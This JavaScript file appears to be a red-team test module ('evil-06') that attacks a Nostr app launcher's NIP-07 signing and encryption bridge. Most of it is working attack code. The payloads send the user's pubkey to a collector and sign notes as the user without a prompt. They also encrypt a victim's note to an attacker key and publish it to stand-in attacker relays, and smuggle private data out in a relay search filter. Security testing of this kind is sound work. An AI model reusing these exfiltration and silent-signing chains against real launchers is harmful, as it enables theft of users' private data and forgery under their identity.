// evil-06 — signer & cipher authority abuse (tier 2). NAPP.md: window.nostr is
// the NIP-07 bridge — getPublicKey, signEvent, nip04/nip44 — handed to every
// napp whose grant includes `identity`, with "sensitive operations such as
// signing … prompt[ing] separately". The prompt IS the security boundary, and
// prompt quality is launcher policy: an auto-allow policy (or one tired
// "always") makes every later call silent. And the cipher methods are a
// built-in exfiltration channel: nip04.encrypt(ATTACKER_KEY, yourData)
// produces a ciphertext only the attacker can read — publish it anywhere.
// utils.subscribe is ungated in the reference (reads don't prompt), and the
// REQ's filter fields travel to whatever relays the napp names — the filter
// itself can carry the data.
window.__EVIL_KIT__ = [
  {
    label: 'cipher exfil call',
    note: 'nip44.encrypt to the ATTACKER\'s pubkey turns the user\'s own bridge into a private-data drop: the ciphertext is readable by exactly one party, and utils.publish (or any relay) is the drop point.',
    data: { call: 'window.nostr.nip44.encrypt(ATTACKER_PUBKEY, <private data>)', then: 'window.napp.utils.publish(signedEvent, ["wss://attacker.example"])' },
  },
  {
    label: 'filter-as-payload relay exfil',
    note: 'utils.subscribe(relays, filter) is ungated in the reference — reads never prompt. The filter travels to the named relays verbatim: NIP-50 search terms (or any array field) can carry the data out.',
    data: { call: 'window.napp.utils.subscribe(["wss://attacker.example"], { kinds: [1], search: "<private data>" })' },
  },
  {
    label: 'the auto-allow residue',
    note: 'The reference remembers "allow always" per napp+method in its own localStorage (nostrapps:permissions). One click of Allow always — or a launcher with an auto-allow policy — and every later signEvent is silent forever.',
    data: { store: { 'evil-06-signer-abuse|signEvent': 'allow' } },
  },
];

const ATTACKER_PK = 'aaaa0e4f3a5c61787b90a1c2d3e4f5061728394a5b6c7d8e9fa0b1c2d3e4f5777';
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
async function rpcOk(method, params) {
  const r = await bridgeRpc(method, params);
  if (r === 'timeout') return { error: 'rpc timeout' };
  if (r && typeof r === 'object' && r.error !== undefined) return { error: r.error };
  return { result: r && r.result !== undefined ? r.result : r };
}
async function victimNote() {
  const r = await rpcOk('nostrdb.query', { filters: { kinds: [1] } });
  const evs = Array.isArray(r.result) ? r.result : [];
  return evs.find(e => (e.content || '').indexOf('victim note') !== -1) || null;
}

const ATTACKS = [
  {
    id: 'pk-handout',
    name: 'pubkey handout',
    target: 'window.nostr.getPublicKey — granted with `identity`, no prompt',
    severity: 'high',
    harm: 'The bridge hands the user\'s pubkey to every identity-granted napp — the basis for all the quieter things below: targeted cipher exfil, user-correlation across apps, personalized bait.',
    evilBrief: 'Calls getPublicKey and POSTs the pubkey to the collector.',
    async demo() {
      const r = await rpcOk('getPublicKey');
      if (typeof r.result === 'string' && r.result.length >= 32) {
        return armed('your pubkey is in my frame: ' + mask(r.result, 10) + ' — the identity grant hands it to any napp, no prompt');
      }
      return blocked('getPublicKey refused: ' + (r.error || 'no key') + ' — the identity grant did not cover me');
    },
    async evil() {
      const r = await rpcOk('getPublicKey');
      const out = { pubkey: r.result || r.error };
      out.exfil = await sendToCollector('pk-handout', { pubkey: r.result });
      return out;
    },
  },
  {
    id: 'silent-sign',
    name: 'prompt-policy silent signing',
    target: 'signEvent\'s only boundary is the launcher\'s prompt policy',
    severity: 'critical',
    harm: 'Under an auto-allow policy (or one remembered "always") signEvent is silent: notes, reactions, zap requests — anything — signed as the user with no dialog. The demo probes the policy with a CIPHER call (no signature is ever produced in demo mode); execute signs a marker for real.',
    evilBrief: 'Calls window.nostr.signEvent on a loud marker note and exfiltrates the resulting signature. If a prompt policy stands in the way, the payload reports the denial — that policy is the only thing that held.',
    async demo() {
      // probe the gated-call channel WITHOUT signing: nip44.encrypt to my own
      // key with a marker (gated exactly like signEvent in the reference)
      const t0 = Date.now();
      const r = await rpcOk('nip44.encrypt', { pubkey: ATTACKER_PK, plaintext: '__evil06_policy_probe__' });
      const ms = Math.round(Date.now() - t0);
      if (typeof r.result === 'string' && r.result.indexOf('FAKE-nip44.encrypt') !== -1) {
        return armed('the gated-call channel AUTO-APPROVED my cipher call in ' + ms + 'ms — signEvent sits behind the same policy and will be equally silent');
      }
      if (r.error && /denied|Permission/i.test(r.error)) {
        if (ms > 2500) {
          return blocked('denied after ' + ms + 'ms — a dialog stood in the way (the launcher asked). Auto-allow policies and one "always" click remove even that; execute in VERY EVIL mode to test the policy for real');
        }
        return blocked('denied in ' + ms + 'ms with no dialog — the launcher refuses gated calls outright (deny-all policy)');
      }
      return na('probe inconclusive: ' + (r.error || String(r.result).slice(0, 40)));
    },
    async evil() {
      const t0 = Date.now();
      const r = await rpcOk('signEvent', {
        kind: 1,
        tags: [['alt', 'evil-06 silent signing proof'], ['client', 'evil-napps']],
        content: 'evil-06: your key signed this note. If you did not see a dialog, the signing policy is silent.',
        created_at: Math.floor(Date.now() / 1000),
      });
      const ms = Math.round(Date.now() - t0);
      if (r.result && r.result.sig) {
        const out = { signed: true, latencyMs: ms, sig: mask(r.result.sig, 12), id: r.result.id };
        out.exfil = await sendToCollector('silent-sign', { event: r.result, latencyMs: ms });
        return out;
      }
      return { signed: false, latencyMs: ms, error: r.error || 'no signature' };
    },
  },
  {
    id: 'nip-exfil',
    name: 'cipher exfiltration channel',
    target: 'nip04/nip44 encrypt to ANY pubkey — the attacker\'s included',
    severity: 'critical',
    harm: 'The user\'s own cipher authority is a private-data drop: nip44.encrypt(ATTACKER_KEY, data) yields a ciphertext readable by exactly one party, and publish (gated, but often auto) is the mailman. Private data leaves as a legitimately-encrypted message to the attacker.',
    evilBrief: 'Reads the victim\'s note out of the shared store, encrypts its content to MY key with nip44, publishes the ciphertext to attacker relays, and POSTs it to the collector — a complete private-data exfil chain.',
    async demo() {
      const r = await rpcOk('nip44.encrypt', { pubkey: ATTACKER_PK, plaintext: '__evil06_channel_probe__' });
      if (typeof r.result === 'string' && r.result.indexOf('to:' + ATTACKER_PK.slice(0, 8)) !== -1) {
        return armed('the bridge encrypted a marker TO MY KEY: ' + mask(r.result, 26) + ' — I am the only party who can read it back. The user\'s own cipher is my private drop; publish is the mailman.');
      }
      if (r.error && /denied|Permission/i.test(r.error)) {
        return blocked('the cipher call was refused (' + r.error + ') — the prompt policy held this channel');
      }
      return na('probe inconclusive: ' + (r.error || String(r.result).slice(0, 40)));
    },
    async evil() {
      const note = await victimNote();
      const data = note ? note.content : '(no victim note found — using marker)';
      const r = await rpcOk('nip44.encrypt', { pubkey: ATTACKER_PK, plaintext: data });
      const out = { victimData: note ? mask(data, 16) : data };
      if (typeof r.result === 'string') {
        out.ciphertextTo = ATTACKER_PK;
        // the drop point: publish the ciphertext toward attacker relays
        const ev = {
          id: randHex(64),
          pubkey: ATTACKER_PK,
          created_at: Math.floor(Date.now() / 1000),
          kind: 1,
          tags: [],
          content: 'dm:' + r.result,
          sig: randHex(128),
        };
        const pub = await rpcOk('napp.publish', { event: ev, relays: ['wss://attacker-relay.example', 'wss://attacker-clone.example'] });
        out.published = !pub.error;
        out.exfil = await sendToCollector('nip-exfil', { ciphertext: r.result, victimData: note ? data : null });
      } else {
        out.error = r.error || 'no ciphertext';
      }
      return out;
    },
  },
  {
    id: 'relay-exfil',
    name: 'relay-REQ exfiltration',
    target: 'utils.subscribe(relays, filter) — ungated, and the filter travels verbatim',
    severity: 'critical',
    harm: 'Reads never prompt, and the REQ goes to whatever relays the napp names with whatever filter it writes: NIP-50 search terms (or any array field) can carry private data to the attacker\'s relay. The request itself is the exfiltration.',
    evilBrief: 'Subscribes to the attacker\'s relay with the VICTIM\'s note content embedded in the filter (NIP-50 search), closes, and POSTs the same filter to the collector.',
    async demo() {
      const got = await new Promise((resolve) => {
        let done = false;
        const finish = (v) => { if (!done) { done = true; resolve(v); } };
        const closer = window.napp && window.napp.utils && window.napp.utils.subscribe
          ? window.napp.utils.subscribe(['wss://attacker.example.invalid'], { kinds: [1], search: '__evil06_req_probe__' }, {
              eoseEventsCallback: () => finish('eose'),
            })
          : null;
        if (!closer) return finish('no-bridge');
        setTimeout(() => finish('no-eose'), 2500);
        // ROE: no lingering channels — close after the probe settles
        setTimeout(() => { try { closer(); } catch (_) {} }, 2600);
      });
      if (got === 'eose') {
        return armed('the launcher accepted my REQ to the ATTACKER\'s relay with my marker in the filter — in a real launcher that filter just left the machine verbatim (reads never prompt)');
      }
      if (got === 'no-eose') {
        return armed('the launcher accepted my REQ to the ATTACKER\'s relay (no eose observed, but the REQ channel is open — reads never prompt)');
      }
      return na('no bridge utils available (at-launcher mode has none)');
    },
    async evil() {
      const note = await victimNote();
      const data = note ? note.content : '__evil06_req_marker__';
      const out = { carried: mask(data, 16) };
      const closer = window.napp.utils.subscribe(['wss://attacker-relay.example'], { kinds: [1], search: data }, {
        eoseEventsCallback: () => {},
      });
      await sleep(600);
      try { closer && closer(); } catch (_) {}
      out.exfil = await sendToCollector('relay-exfil', { filter: { kinds: [1], search: data } });
      return out;
    },
  },
];
